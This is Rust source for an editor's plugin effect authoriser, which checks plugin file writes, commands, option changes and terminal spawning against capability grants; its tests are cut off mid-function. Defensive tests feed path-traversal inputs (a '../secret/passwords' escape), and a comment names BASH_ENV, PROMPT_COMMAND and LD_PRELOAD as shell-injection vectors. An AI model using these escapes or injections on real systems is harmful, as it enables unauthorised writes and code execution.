//! XF.4 — authorising a guest-returned effect's file paths.
//!
//! Design: [`cross-file-writes.md`](../../../docs/dev/architecture/cross-file-writes.md) §6.
//!
//! ## Why the check lives at the boundary
//!
//! `Effect::WriteToFile` writes into a file the editor may not have open. That
//! needs `fs:write` authority over the path, and the check has exactly one
//! place it can run.
//!
//! Not at the applier: by the time an effect reaches `Editor::handle_effect`
//! the host has no idea which plugin produced it, because effects from a
//! plugin and from a native mode are the same type — deliberately, since that
//! is what lets a mode drive an edit without the host growing a per-feature
//! `Action`. Threading a plugin id through the effect would mean putting
//! provenance inside guest-returned data, which is exactly what
//! `provenance_ids_are_host_issued_unique_and_stamp_the_plugin_layer` forbids.
//!
//! At the boundary the provenance is still known: the trampoline holds the
//! plugin's `Store<PluginState>`, and `PluginState::grant` is its effective
//! [`CapabilityGrant`]. So the conversion authorises, and an effect that
//! reaches the editor has already been checked.
//!
//! ## What a denial does
//!
//! Replaces the effect with an `Echo`, so the user is told rather than left
//! wondering why a key did nothing — the same reasoning as
//! `ProviderViewOutcome::Declined`.
//!
//! **And drops what came after it in the batch** (CD.3c). This used to keep
//! the rest of a `Many`, on the reasoning that "one denied write must not
//! silently cancel the other things an action did". That holds for independent
//! effects and is wrong for a commit, where what follows a write presumes it
//! happened: org's capture returned `[write, close the buffer]`, so a denied
//! target closed the capture and the user's text went with it. The host's
//! applier stops a batch after a write that fails for any other reason
//! (`apply_effect_host`); a denial is the same failure, found earlier, and is
//! handled the same way. Effects *before* the write are kept.

use std::path::{Path, PathBuf};

use lattice_core::tracked::TrackedRangeId;
use lattice_grammar::{EchoLevel, Effect as NativeEffect};

/// RF.4d: the space a guest's range id is minted in before the authorizer
/// knows which plugin sent it. No plugin is given it.
pub(crate) const UNASSIGNED_RANGE_SPACE: u32 = 0x7fff_ffff;

/// RF.4d: the editor-wide id of plugin range `guest` in range space `space`
/// (the plugin's numeric id). The top bit marks a plugin's range: native
/// callers mint theirs from [`TrackedRangeId::next`]'s counter, which never
/// reaches it, so a plugin cannot name a snippet's placeholder or the
/// assistant's rewrite region — and, spaces being per plugin, nor another
/// plugin's range.
pub(crate) fn plugin_range_id(space: u32, guest: u32) -> TrackedRangeId {
    TrackedRangeId((1 << 63) | (u64::from(space & 0x7fff_ffff) << 32) | u64::from(guest))
}

/// The guest's own number for `id`, inverting [`plugin_range_id`].
pub(crate) fn guest_range_id(id: TrackedRangeId) -> u32 {
    (id.0 & 0xffff_ffff) as u32
}

use crate::capability::CapabilityGrant;

/// Authorises the file paths in a plugin's returned effects against its grant.
///
/// Built once per plugin at load — a grant never changes for a plugin's life,
/// so nothing here costs anything per keystroke beyond the prefix compare a
/// `WriteToFile` actually needs.
#[derive(Debug, Clone)]
pub struct EffectAuthorizer {
    /// Only the WRITE prefixes. A plugin granted `fs:read` over a tree may not
    /// write into it — `walk_within_grant` accepts read *or* write because a
    /// walk only reads, and this is the other half of that distinction.
    write_prefixes: Vec<PathBuf>,
    plugin: String,
    /// PMF.6: the option-bound write grants, for naming the option in a refusal.
    option_bound: Vec<crate::capability::OptionBoundGrant>,
    /// RF.4d: the plugin's range space, where its tracked-range ids live.
    /// `UNASSIGNED_RANGE_SPACE` until [`Self::with_range_space`].
    range_space: u32,
    /// OB.3a: what the plugin may name for the host to run.
    gate: CommandGate,
}

/// OB.3a: which commands, options and programs a plugin may name in what it
/// hands the host.
///
/// Effects lose their provenance once they leave the boundary — that is
/// deliberate (see the module note) — so a command a plugin names runs with
/// the user's whole authority. `shell-command`, `!` and `ex:filter` run a
/// program; `set` moves an option a plugin's grant follows. The plugin's
/// grant cannot be checked where those run, so it is checked here, where the
/// plugin is still known. **Default closed:** a plugin may name a command a
/// plugin registered, or a native one its owner opened
/// ([`lattice_grammar::CommandRegistry::allow_plugin_invocation`]), and
/// nothing else — a native command that forgets to say is refused, visibly,
/// rather than reachable by every plugin.
///
/// The name must be the registered name exactly. No alias, no `ex:` guess,
/// no ex-line syntax: the host dispatches a registered name as that command
/// and nothing else (`Editor::invoke_command_named`), so the command checked
/// is the command run.
///
/// The user's `init.rs` (the config authority, PMF.15) is exempt: it is the
/// user's own code.
#[derive(Clone, Default)]
pub struct CommandGate {
    plugin: String,
    commands: Option<lattice_grammar::CommandRegistryHandle>,
    guard: Option<crate::GrantGuardHandle>,
    options: Option<std::sync::Arc<lattice_config::ConfigRegistry>>,
    /// The UNBOUND `proc:spawn`: a terminal running a command is a process.
    proc_spawn: bool,
}

impl std::fmt::Debug for CommandGate {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CommandGate")
            .field("plugin", &self.plugin)
            .field("commands", &self.commands.is_some())
            .field("guard", &self.guard.is_some())
            .field("options", &self.options.is_some())
            .field("proc_spawn", &self.proc_spawn)
            .finish()
    }
}

impl CommandGate {
    /// The gate for `plugin`, checking against the editor's `commands` and the
    /// shared grant guard; `options` resolves an option alias to the name the
    /// guard knows.
    pub(crate) fn new(
        plugin: impl Into<String>,
        grant: &CapabilityGrant,
        commands: Option<lattice_grammar::CommandRegistryHandle>,
        guard: crate::GrantGuardHandle,
        options: Option<std::sync::Arc<lattice_config::ConfigRegistry>>,
    ) -> Self {
        Self {
            plugin: plugin.into(),
            commands,
            guard: Some(guard),
            options,
            proc_spawn: grant.proc_spawn,
        }
    }

    /// Is this the user's `init.rs`?
    fn is_authority(&self) -> bool {
        self.guard.as_ref().is_some_and(|guard| {
            guard
                .read()
                .unwrap_or_else(std::sync::PoisonError::into_inner)
                .authority
                .as_deref()
                == Some(self.plugin.as_str())
        })
    }

    /// May the plugin name command `name`? `Err` is the refusal, for the user.
    pub fn check_command(&self, name: &str) -> Result<(), String> {
        if self.is_authority() {
            return Ok(());
        }
        let permitted = self.commands.as_ref().and_then(|commands| {
            let commands = commands.load();
            let id = commands.id_by_name(name)?;
            commands.lookup(id).map(|spec| self.permits(spec))
        });
        match permitted {
            Some(true) => Ok(()),
            Some(false) => Err(self.refusal(name)),
            None => Err(format!(
                "{}: refused to run `{name}` — no command is registered under that name",
                self.plugin
            )),
        }
    }

    /// May the plugin run the command `spec` describes? For a caller that has
    /// already resolved the name against its own registry snapshot — and runs
    /// what it resolved — so the check and the run see the same command.
    pub fn permits(&self, spec: &lattice_grammar::CommandSpec) -> bool {
        spec.plugin_may_invoke() || self.is_authority()
    }

    /// The refusal for a command the plugin may not run.
    pub fn refusal(&self, name: &str) -> String {
        format!(
            "{}: refused to run `{name}` — a plugin may run only plugin commands \
             and the editor commands opened to plugins",
            self.plugin
        )
    }

    /// Does `name` name a REGISTERED command the plugin may not run? `false`
    /// for one not registered (yet) — see the picker's delete verb, the one
    /// caller that checks before the plugin's own commands exist.
    pub(crate) fn names_a_closed_command(&self, name: &str) -> bool {
        if self.is_authority() {
            return false;
        }
        let Some(commands) = &self.commands else {
            return false;
        };
        let commands = commands.load();
        commands
            .id_by_name(name)
            .and_then(|id| commands.lookup(id))
            .is_some_and(|spec| !spec.plugin_may_invoke())
    }

    /// May the plugin apply `:set {spec}`? Refused when it names an option a
    /// plugin's grant follows (PMF.5) — the config seam's `set-option` refuses
    /// the same, and an effect must not be the way round it.
    pub fn check_set_option(&self, spec: &str) -> Result<(), String> {
        if self.is_authority() {
            return Ok(());
        }
        let Some(guard) = &self.guard else {
            return Ok(());
        };
        let Ok(parsed) = lattice_config::parse_set(spec) else {
            // The host's parse fails the same way and writes nothing.
            return Ok(());
        };
        let name = match parsed {
            lattice_config::ParsedSet::Query(_) => return Ok(()),
            lattice_config::ParsedSet::Assign { name, .. }
            | lattice_config::ParsedSet::NameOnly(name)
            | lattice_config::ParsedSet::Reset(name) => vec![name],
            // `noX` may name `noX` itself or negate `X`: check both.
            lattice_config::ParsedSet::Negate(rest) => vec![format!("no{rest}"), rest],
        };
        let guard = guard
            .read()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        for written in name {
            // The guard knows canonical names; an alias the plugin itself
            // registered must not be the way past it.
            let canonical = self
                .options
                .as_ref()
                .and_then(|o| o.lookup(&written))
                .map(|o| o.name().to_string());
            for option in std::iter::once(written.as_str()).chain(canonical.as_deref()) {
                if guard.refuses(option, Some(&self.plugin)) {
                    return Err(format!(
                        "{}: refused to set `{option}` — it decides what a plugin may access \
                         or run, so only your configuration (`:set`, lattice.toml, init.rs) \
                         can change it",
                        self.plugin
                    ));
                }
            }
        }
        Ok(())
    }

    /// May the plugin open a terminal running `cmd_line`, with `env` added?
    /// A terminal that runs a command is a process, so it takes the unbound
    /// `proc:spawn`. Without a command it is the user's own shell, in front of
    /// them (`:project-shell`), and that needs nothing, but only as the user
    /// would get it: with no environment of the plugin's. A variable is code
    /// in the shell it reaches (`BASH_ENV`, `PROMPT_COMMAND`, `LD_PRELOAD`),
    /// so `env` takes `proc:spawn` too (review, 2026-11-23).
    pub fn check_terminal(
        &self,
        cmd_line: Option<&str>,
        env: &[(String, String)],
    ) -> Result<(), String> {
        if self.proc_spawn || self.is_authority() {
            return Ok(());
        }
        match (cmd_line, env.first()) {
            (Some(cmd), _) => Err(format!(
                "{}: refused to run `{cmd}` in a terminal — that needs the `proc:spawn` capability",
                self.plugin
            )),
            (None, Some((name, _))) => Err(format!(
                "{}: refused to open a shell with `{name}` set — setting a shell's environment \
                 needs the `proc:spawn` capability",
                self.plugin
            )),
            (None, None) => Ok(()),
        }
    }

    /// May the plugin type into the focused terminal? Bytes into a shell are a
    /// command it runs, in whatever terminal the user has in front of them, so
    /// this takes `proc:spawn` as running one does (review, 2026-11-23).
    pub fn check_terminal_input(&self) -> Result<(), String> {
        if self.proc_spawn || self.is_authority() {
            return Ok(());
        }
        Err(format!(
            "{}: refused to type into a terminal — that needs the `proc:spawn` capability",
            self.plugin
        ))
    }
}

impl EffectAuthorizer {
    pub fn new(grant: &CapabilityGrant, plugin: impl Into<String>) -> Self {
        Self {
            write_prefixes: grant
                .fs
                .iter()
                .filter(|g| g.write)
                .map(|g| g.prefix.clone())
                .collect(),
            plugin: plugin.into(),
            option_bound: Vec::new(),
            range_space: UNASSIGNED_RANGE_SPACE,
            gate: CommandGate {
                plugin: String::new(),
                proc_spawn: grant.proc_spawn,
                ..CommandGate::default()
            },
        }
    }

    /// OB.3a: check the commands, options and programs this plugin names
    /// against `gate`. Unset, the gate refuses every command (no registry to
    /// find one in) and every terminal command a plugin without `proc:spawn`
    /// asks for.
    pub fn with_command_gate(mut self, gate: CommandGate) -> Self {
        self.gate = gate;
        self
    }

    /// OB.3a: the gate, for the seams that hand the host a command name
    /// outside an effect (a picker's accept, a row's routing).
    pub fn command_gate(&self) -> &CommandGate {
        &self.gate
    }

    /// RF.4d: move this plugin's tracked-range ids into `space`, its numeric
    /// plugin id — the same space `document.tracked-range` reads from.
    pub fn with_range_space(mut self, space: u32) -> Self {
        self.range_space = space;
        self
    }

    /// PMF.6: the option-bound write grants behind `write_prefixes`, so a
    /// refusal names the option that decides where the plugin may write —
    /// *outside org.directory (~/notes) — set org.directory …* — instead of a
    /// generic "outside the granted paths" the user cannot act on.
    pub fn with_option_bound(mut self, bound: Vec<crate::capability::OptionBoundGrant>) -> Self {
        self.option_bound = bound.into_iter().filter(|g| g.write).collect();
        self
    }

    /// The refusal text for a write to `path` outside every grant.
    fn refusal(&self, path: &Path) -> String {
        if self.option_bound.is_empty() {
            return format!(
                "{}: write denied — {} is outside the plugin's granted paths",
                self.plugin,
                path.display()
            );
        }
        let shown = |p: &Option<std::path::PathBuf>| match p {
            Some(p) => lattice_core::home::contract_tilde(p),
            None => "not set".to_string(),
        };
        let where_ = self
            .option_bound
            .iter()
            .map(|g| format!("{} ({})", g.option, shown(&g.path)))
            .collect::<Vec<_>>()
            .join(", ");
        format!(
            "{}: write denied — {} is outside {} — set {} to change where {} may write",
            self.plugin,
            lattice_core::home::contract_tilde(path),
            where_,
            self.option_bound[0].option,
            self.plugin
        )
    }

    /// True when `path` lies within one of the plugin's `fs:write` prefixes.
    ///
    /// Both sides are canonicalized so a `..` segment cannot escape a granted
    /// prefix — the same rule `host_services::grant_permits_walk` applies, and
    /// for the same reason.
    ///
    /// **A target that does not exist yet canonicalizes its nearest real
    /// ANCESTOR.** Capture's first run creates its file, and a non-existent
    /// path canonicalizes to nothing; without this, "create the capture file"
    /// would be a permanent denial and the feature would be unreachable by
    /// design. Walking up rather than stopping at the immediate parent is what
    /// makes the same true when the directory is new too — see
    /// [`resolve_for_compare`].
    ///
    /// A path that still will not resolve falls back to its raw form, which
    /// requires a literal prefix match — so it can only ever deny more, never
    /// widen. Failing safe.
    pub fn permits_write(&self, path: &Path) -> bool {
        if self.write_prefixes.is_empty() {
            return false;
        }
        let real = resolve_for_compare(path);
        self.write_prefixes.iter().any(|prefix| {
            let canon_prefix = std::fs::canonicalize(prefix).unwrap_or_else(|_| prefix.clone());
            real.starts_with(&canon_prefix)
        })
    }

    /// Authorise an effect, replacing any unpermitted `WriteToFile` with an
    /// `Echo` naming the refusal.
    ///
    /// Recurses into `Many` so a write buried in a compound effect is checked
    /// too — an unchecked path there would be the whole gate, bypassed by
    /// wrapping.
    pub fn authorize(&self, effect: NativeEffect) -> NativeEffect {
        self.authorize_batch(effect).0
    }

    /// [`Self::authorize`], also reporting whether a write was denied — the
    /// signal that truncates every enclosing `Many`, not only the innermost.
    fn authorize_batch(&self, effect: NativeEffect) -> (NativeEffect, bool) {
        match effect {
            NativeEffect::Many(parts) => {
                let mut kept = Vec::with_capacity(parts.len());
                for part in parts {
                    let (part, denied) = self.authorize_batch(part);
                    kept.push(part);
                    if denied {
                        return (NativeEffect::Many(kept), true);
                    }
                }
                (NativeEffect::Many(kept), false)
            }
            NativeEffect::WriteToFile { ref path, .. } if !self.permits_write(path) => {
                // `info!`: one-shot and user-actionable ("a plugin was denied
                // fs access"), which is the level rule's own example — not the
                // per-keystroke `debug!` class.
                tracing::info!(
                    plugin = %self.plugin,
                    path = %path.display(),
                    "write-to-file denied: outside the plugin's fs:write grant"
                );
                (
                    NativeEffect::Echo {
                        level: EchoLevel::Warn,
                        text: self.refusal(path),
                    },
                    true,
                )
            }
            // OB.3a: what names a command, an option or a program.
            effect @ (NativeEffect::InvokeCommand { .. }
            | NativeEffect::Confirm { .. }
            | NativeEffect::OpenPrompt { .. }
            | NativeEffect::OpenPicker {
                fill_action: Some(_),
                ..
            }
            | NativeEffect::Lsp(lattice_grammar::LspRequest::CodeActions {
                otherwise: Some(_),
                ..
            })
            | NativeEffect::SetOption { .. }
            | NativeEffect::SetLocalOption { .. }
            | NativeEffect::SetGlobalOption { .. }
            | NativeEffect::SpawnTerminal { .. }
            | NativeEffect::TerminalInput(_)) => match self.check_named(&effect) {
                Ok(()) => (effect, false),
                Err(text) => {
                    // `info!`: one-shot and user-actionable, as a denied write is.
                    tracing::info!(plugin = %self.plugin, %text, "plugin effect refused");
                    (
                        NativeEffect::Echo {
                            level: EchoLevel::Warn,
                            text,
                        },
                        true,
                    )
                }
            },
            // RF.4d: the id came across in the unassigned space; this is the
            // one place that knows whose it is.
            NativeEffect::TrackRange {
                target,
                id,
                range,
                element,
            } => (
                NativeEffect::TrackRange {
                    target,
                    id: plugin_range_id(self.range_space, guest_range_id(id)),
                    range,
                    element,
                },
                false,
            ),
            NativeEffect::UntrackRange { target, id } => (
                NativeEffect::UntrackRange {
                    target,
                    id: plugin_range_id(self.range_space, guest_range_id(id)),
                },
                false,
            ),
            other => (other, false),
        }
    }
}

impl EffectAuthorizer {
    /// OB.3a: the gate's verdict on an effect that names a command, an option
    /// or a program.
    fn check_named(&self, effect: &NativeEffect) -> Result<(), String> {
        let gate = &self.gate;
        match effect {
            NativeEffect::InvokeCommand { id, .. } => gate.check_command(id),
            NativeEffect::Confirm { yes_action, .. } => gate.check_command(yes_action),
            NativeEffect::OpenPrompt {
                on_submit_action, ..
            } => gate.check_command(on_submit_action),
            NativeEffect::OpenPicker {
                fill_action: Some(action),
                ..
            } => gate.check_command(action),
            NativeEffect::Lsp(lattice_grammar::LspRequest::CodeActions {
                otherwise: Some(fallback),
                ..
            }) => gate.check_command(&fallback.id),
            NativeEffect::SetOption { spec }
            | NativeEffect::SetLocalOption { spec }
            | NativeEffect::SetGlobalOption { spec } => gate.check_set_option(spec),
            NativeEffect::SpawnTerminal { cmd_line, env, .. } => {
                gate.check_terminal(cmd_line.as_deref(), env)
            }
            NativeEffect::TerminalInput(_) => gate.check_terminal_input(),
            _ => Ok(()),
        }
    }

    /// OB.3a: hold a POSTED batch to the effects a posting plugin may send.
    ///
    /// A returned effect answers something the user just did; a posted one
    /// (`host-services.post-effects`, from the events seam) can arrive at any
    /// moment, with nothing asked for. So the posted path does not get the
    /// returned path's whole vocabulary — quitting the editor, opening an
    /// external URI, invoking a command, setting an option or spawning a
    /// terminal unprompted are not a background job's to do. What it may send
    /// is what writing a job's result needs, and nothing else:
    ///
    /// - `apply-edit` — the result, into a buffer;
    /// - `write-to-file` — the same into a file, still under `fs:write`
    ///   ([`Self::authorize`] runs first). Never with a `cut`: the cut is
    ///   taken from "the buffer the action ran in", and a post ran in none,
    ///   so it would land in whatever buffer has focus when it arrives;
    /// - `track-range` / `untrack-range` — following where the result went,
    ///   in the plugin's own range space;
    /// - `open-synthetic-buffer` — the buffer a result goes to when there is
    ///   nowhere else (`*org-babel*`);
    /// - `echo` — telling the user it finished, or why it did not.
    ///
    /// Anything else becomes a warning naming it, and ends the batch: what
    /// followed may presume it happened (the CD.3c rule for a denied write).
    /// Widen this only when a consumer needs it, with the reason recorded in
    /// the org-babel slice plan's decision log.
    pub fn restrict_posted(&self, effect: NativeEffect) -> NativeEffect {
        self.restrict_posted_batch(effect).0
    }

    fn restrict_posted_batch(&self, effect: NativeEffect) -> (NativeEffect, bool) {
        match effect {
            NativeEffect::Many(parts) => {
                let mut kept = Vec::with_capacity(parts.len());
                for part in parts {
                    let (part, refused) = self.restrict_posted_batch(part);
                    kept.push(part);
                    if refused {
                        return (NativeEffect::Many(kept), true);
                    }
                }
                (NativeEffect::Many(kept), false)
            }
            allowed @ (NativeEffect::None
            | NativeEffect::ApplyEdit { .. }
            | NativeEffect::WriteToFile { cut: None, .. }
            | NativeEffect::TrackRange { .. }
            | NativeEffect::UntrackRange { .. }
            | NativeEffect::OpenSyntheticBuffer { .. }
            | NativeEffect::Echo { .. }) => (allowed, false),
            refused => {
                let name = match &refused {
                    NativeEffect::WriteToFile { cut: Some(_), .. } => {
                        "WriteToFile with a cut".to_string()
                    }
                    other => effect_name(other),
                };
                // `info!`: one-shot and user-actionable, as a denied write is.
                tracing::info!(
                    plugin = %self.plugin,
                    effect = %name,
                    "post-effects refused an effect the posted path does not carry"
                );
                (
                    NativeEffect::Echo {
                        level: EchoLevel::Warn,
                        text: format!(
                            "{}: refused {name} — a plugin may not post it from the background",
                            self.plugin
                        ),
                    },
                    true,
                )
            }
        }
    }
}

/// The variant name of `effect` (`QuitEditor`), for a refusal. Its `Debug`
/// form starts with it; the payload, which may carry anything, is cut off.
fn effect_name(effect: &NativeEffect) -> String {
    let debug = format!("{effect:?}");
    debug
        .split(|c: char| !c.is_alphanumeric())
        .next()
        .unwrap_or_default()
        .to_string()
}

/// The path to compare against a granted prefix.
///
/// Canonicalize the target; if it does not exist, canonicalize the nearest
/// ancestor that DOES and re-attach the unresolved tail. Falls back to the raw
/// path when no ancestor resolves.
///
/// **Walking up all the way, not just one level.** Canonicalizing only the
/// immediate parent covers "the file is new in a directory that exists" and
/// silently fails "the file is new in a directory that is new too" — which is
/// every first write into a subdirectory a plugin owns: org-roam's
/// `daily/YYYY-MM-DD.org` on the day the journal starts, and capture's target
/// under a fresh folder. There the parent does not resolve either, the raw path
/// is used, and it is compared against a CANONICALIZED prefix — so on any
/// system where the grant sits behind a symlink the match fails and the write
/// is denied. macOS makes that the common case rather than the exotic one:
/// `/tmp` and `/var/folders` are both symlinks into `/private`, so a grant over
/// a temporary directory never matched a path this function had given up on.
///
/// The denial was indistinguishable from a capability the user had not granted
/// — the message names the path and says it is outside the granted paths, which
/// is exactly what it says when the grant really is missing.
///
/// Still fails safe: re-attaching an unresolved tail can only ever produce a
/// path at or below a real directory, and `..` inside the tail is normalised
/// away rather than followed, so a tail cannot climb back out of the prefix
/// that was just resolved.
pub(crate) fn resolve_for_compare(path: &Path) -> PathBuf {
    if let Ok(real) = std::fs::canonicalize(path) {
        return real;
    }
    // `.` contributes nothing and `..` pops — normalising rather than joining
    // blindly is what keeps an unresolved tail from escaping the ancestor it
    // was resolved against.
    let apply = |mut base: PathBuf, tail: &Path| {
        for segment in tail.components() {
            match segment {
                std::path::Component::ParentDir => {
                    base.pop();
                }
                std::path::Component::CurDir => {}
                other => base.push(other),
            }
        }
        base
    };
    // Walk by `ancestors`, not by `parent` + `file_name`: `file_name` is
    // `None` for a path ending in `..`, so that walk STOPPED at the first
    // `..` it met and handed back the raw path — and the raw
    // `<grant>/new/../../x` still starts with `<grant>` component for
    // component, so the write was permitted outside the grant.
    for ancestor in path.ancestors().skip(1) {
        if let Ok(real) = std::fs::canonicalize(ancestor)
            && let Ok(tail) = path.strip_prefix(ancestor)
        {
            return apply(real, tail);
        }
    }
    // Nothing resolved at all (a relative path whose every ancestor is
    // missing). Still never the raw path: its `..` segments are applied, so
    // what is compared is where the write would land.
    apply(PathBuf::new(), path)
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::panic)]

    use super::*;
    use crate::capability::FsGrant;

    fn grant(prefix: &Path, write: bool) -> CapabilityGrant {
        CapabilityGrant {
            fs: vec![FsGrant {
                prefix: prefix.to_path_buf(),
                write,
            }],
            ..Default::default()
        }
    }

    fn tmp(tag: &str) -> PathBuf {
        static N: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
        let n = N.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let dir = std::env::temp_dir().join(format!("lattice-xf4-{tag}-{nanos}-{n}"));
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn write_effect(path: &Path) -> NativeEffect {
        NativeEffect::WriteToFile {
            path: path.to_path_buf(),
            anchor: lattice_grammar::FileAnchor::End,
            text: "x\n".to_string(),
            cut: None,
            create_parents: false,
            save: false,
        }
    }

    #[test]
    fn a_path_inside_a_write_grant_is_permitted() {
        let dir = tmp("inside");
        let file = dir.join("archive.org");
        std::fs::write(&file, "").unwrap();

        let auth = EffectAuthorizer::new(&grant(&dir, true), "org");
        assert!(auth.permits_write(&file));
    }

    #[test]
    fn a_path_outside_every_prefix_is_refused() {
        let granted = tmp("outside-granted");
        let other = tmp("outside-other");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");
        assert!(!auth.permits_write(&other.join("archive.org")));
    }

    /// A READ grant is not a write grant. `walk_within_grant` accepts either
    /// because a walk only reads; this is the other half of that distinction,
    /// and conflating them would let any plugin that can list a tree write
    /// into it.
    #[test]
    fn a_read_only_grant_does_not_permit_writing() {
        let dir = tmp("readonly");
        let file = dir.join("archive.org");
        std::fs::write(&file, "").unwrap();

        let auth = EffectAuthorizer::new(&grant(&dir, false), "org");
        assert!(!auth.permits_write(&file));
    }

    #[test]
    fn a_plugin_with_no_fs_grant_writes_nothing() {
        let dir = tmp("nogrant");
        let file = dir.join("archive.org");
        std::fs::write(&file, "").unwrap();

        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
        assert!(!auth.permits_write(&file));
    }

    /// The escape attempt. Without canonicalizing both sides, a path that
    /// *textually* starts with the prefix walks straight out of it.
    #[test]
    fn dotdot_cannot_escape_a_granted_prefix() {
        let base = tmp("escape");
        let granted = base.join("granted");
        let secret = base.join("secret");
        std::fs::create_dir_all(&granted).unwrap();
        std::fs::create_dir_all(&secret).unwrap();
        let target = secret.join("passwords");
        std::fs::write(&target, "").unwrap();

        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");

        let escaping = granted.join("..").join("secret").join("passwords");
        assert!(
            !auth.permits_write(&escaping),
            "`<granted>/../secret/passwords` resolves outside the grant and \
             must be refused — a textual prefix match would have allowed it"
        );
    }

    /// Capture's first run. The file does not exist, so it cannot be
    /// canonicalized; the PARENT is what decides. Without this the whole
    /// create-a-capture-file case would be permanently denied.
    #[test]
    fn a_not_yet_existing_file_is_judged_by_its_parent() {
        let dir = tmp("create");
        let missing = dir.join("capture.org");
        assert!(!missing.exists());

        let auth = EffectAuthorizer::new(&grant(&dir, true), "org");
        assert!(
            auth.permits_write(&missing),
            "a file this write would create must be permitted, or capture is \
             unreachable by construction"
        );
    }

    /// OR.10's first journal entry: the file is new AND so is the directory
    /// holding it, so neither the target nor its parent canonicalizes.
    ///
    /// Judging by the immediate parent alone fell back to the RAW path here and
    /// compared it against a canonicalized prefix — which on macOS never
    /// matches, because `std::env::temp_dir()` is a symlink into `/private`. So
    /// the very first `:org-roam-dailies-today` was denied with a message that
    /// reads exactly like a missing capability, and the second one (after the
    /// directory existed) worked.
    #[test]
    fn a_new_file_under_a_new_directory_is_judged_by_the_nearest_real_ancestor() {
        let dir = tmp("create-deep");
        let missing = dir.join("daily").join("2026-08-30.org");
        assert!(!missing.parent().unwrap().exists());

        let auth = EffectAuthorizer::new(&grant(&dir, true), "org");
        assert!(
            auth.permits_write(&missing),
            "a plugin writing the first file into a subdirectory it owns must \
             be permitted, or the feature is unreachable on its first use"
        );
    }

    /// …and walking up does not become a hole either. The tail is normalised,
    /// so `..` cannot climb back out of the ancestor it resolved against.
    #[test]
    fn an_unresolved_tail_cannot_escape_the_prefix_with_dotdot() {
        let granted = tmp("escape-granted");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");
        assert!(
            !auth.permits_write(&granted.join("new").join("..").join("..").join("stolen.org")),
            "a `..` in the unresolved tail must not widen the grant"
        );
    }

    /// …and the parent check does not become a hole: a non-existent file in a
    /// non-granted directory is still refused.
    #[test]
    fn a_not_yet_existing_file_outside_the_grant_is_still_refused() {
        let granted = tmp("create-granted");
        let other = tmp("create-other");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");
        assert!(!auth.permits_write(&other.join("capture.org")));
    }

    #[test]
    fn a_permitted_effect_passes_through_unchanged() {
        let dir = tmp("passthrough");
        let file = dir.join("a.org");
        std::fs::write(&file, "").unwrap();
        let auth = EffectAuthorizer::new(&grant(&dir, true), "org");

        assert!(matches!(
            auth.authorize(write_effect(&file)),
            NativeEffect::WriteToFile { .. }
        ));
    }

    #[test]
    fn a_denied_effect_becomes_an_echo_naming_the_plugin() {
        let granted = tmp("denied-granted");
        let other = tmp("denied-other");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");

        match auth.authorize(write_effect(&other.join("a.org"))) {
            NativeEffect::Echo { level, text } => {
                assert_eq!(level, EchoLevel::Warn);
                assert!(text.contains("org"), "names the plugin: {text}");
                assert!(text.contains("denied"), "{text}");
            }
            other => panic!("expected an Echo, got {other:?}"),
        }
    }

    /// OB.9: `whole` replaces a file's entire text, the most destructive
    /// anchor, and it is checked exactly as an insert is: by the path. Inside
    /// the grant it passes unchanged; outside it is refused.
    #[test]
    fn whole_outside_the_grant_is_refused() {
        let granted = tmp("whole-granted");
        let other = tmp("whole-other");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");
        let whole = |path: PathBuf| NativeEffect::WriteToFile {
            path,
            anchor: lattice_grammar::FileAnchor::Whole,
            text: "x\n".to_string(),
            cut: None,
            create_parents: false,
            save: true,
        };
        assert!(matches!(
            auth.authorize(whole(other.join("out.sh"))),
            NativeEffect::Echo {
                level: EchoLevel::Warn,
                ..
            }
        ));
        assert!(matches!(
            auth.authorize(whole(granted.join("out.sh"))),
            NativeEffect::WriteToFile {
                anchor: lattice_grammar::FileAnchor::Whole,
                ..
            }
        ));
    }

    /// A write buried inside a `Many` is checked too. Missing this would be
    /// the entire gate, bypassed by wrapping the effect in a list.
    #[test]
    fn a_write_nested_in_many_is_authorized_too() {
        let granted = tmp("nested-granted");
        let other = tmp("nested-other");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");

        let effect = NativeEffect::Many(vec![
            NativeEffect::None,
            NativeEffect::Many(vec![write_effect(&other.join("a.org"))]),
        ]);

        match auth.authorize(effect) {
            NativeEffect::Many(parts) => match &parts[1] {
                NativeEffect::Many(inner) => assert!(
                    matches!(inner[0], NativeEffect::Echo { .. }),
                    "a nested write must be refused, not passed through"
                ),
                other => panic!("expected a nested Many, got {other:?}"),
            },
            other => panic!("expected a Many, got {other:?}"),
        }
    }

    /// CD.3c: a denied write drops what follows it — the effects after a write
    /// presume it happened (capture closes its buffer after filing) — and
    /// keeps what came before it. This reverses the earlier "the rest of a
    /// `Many` survives" rule; see the module doc.
    #[test]
    fn a_denied_write_drops_the_rest_of_its_batch_and_keeps_the_start() {
        let granted = tmp("survive-granted");
        let other = tmp("survive-other");
        let auth = EffectAuthorizer::new(&grant(&granted, true), "org");

        let effect = NativeEffect::Many(vec![
            NativeEffect::CursorMove(lattice_protocol::position::Position::new(1, 0)),
            write_effect(&other.join("a.org")),
            NativeEffect::BufferDelete { force: true },
        ]);

        match auth.authorize(effect) {
            NativeEffect::Many(parts) => {
                assert_eq!(
                    parts.len(),
                    2,
                    "the close after the write is dropped: {parts:?}"
                );
                assert!(
                    matches!(parts[0], NativeEffect::CursorMove(_)),
                    "before: kept"
                );
                assert!(
                    matches!(parts[1], NativeEffect::Echo { .. }),
                    "the denial is said"
                );
            }
            other => panic!("expected a Many, got {other:?}"),
        }
    }

    /// The truncation reaches the enclosing batch too — a write nested one
    /// level down stops its parent's later effects, not only its siblings.
    #[test]
    fn a_nested_denial_truncates_the_enclosing_batch() {
